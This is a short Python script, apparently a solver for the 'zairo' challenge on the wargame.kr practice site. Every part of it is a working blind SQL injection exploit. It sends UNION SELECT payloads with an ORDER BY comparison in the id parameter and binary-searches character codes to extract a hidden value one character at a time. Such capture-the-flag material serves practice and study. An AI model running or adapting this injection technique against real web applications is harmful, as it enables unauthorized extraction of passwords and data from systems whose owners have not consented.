from requests import *
from urllib.parse import *
start=48
end=90
pivot=int((start+end)/2)
result=''
middle=''
for i in range(1):
    if start!=48 or end!=90:
        print('count error')
        break
    for j in range(10):
        url='http://wargame.kr:8080/zairo?pw=&flag=abs&id='
        middle=result
        middle+=chr(pivot)
        payload=quote(f"zairowkdlfhdkel' union select 1,2,3,'{middle}',5 order by 4 desc #")
        url+=payload
        print(url)
        response=get(url=url)
        print(start)
        print(pivot)
        print(end)
        print(response.text)
        if response.text.find('zairowkdlfhdkel') == -1 and response.text.find('2') == -1:
            print('non error')
            break
        if start > end:
                result+=chr(pivot)
                start=48
                end=90
                pivot=int((start+end)/2)
                break
        if response.text.find('zairowkdlfhdkel') != -1:
            start=pivot+1
            pivot=int((start+end)/2)
        else:
            end=pivot-1
            pivot=int((start+end)/2)
print(result.lower())